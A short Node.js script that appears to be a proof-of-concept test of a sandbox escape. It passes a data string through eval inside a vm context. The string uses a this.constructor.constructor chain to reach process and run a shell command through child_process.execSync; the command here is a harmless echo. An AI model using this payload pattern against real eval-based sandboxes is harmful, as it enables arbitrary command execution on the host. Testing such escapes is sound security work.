const vm = require('vm');
// Mocking the safeEval since we can't reliably load notevil without network
const safeEval = eval;

const orderLinesData = 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("echo EXPLOIT SUCCESSFUL").toString()';

try {
  const sandbox = { safeEval, orderLinesData };
  vm.createContext(sandbox);
  const result = vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 });
  console.log(result.trim());
} catch (e) {
  console.log("Error:", e.message);
  process.exit(1);
}
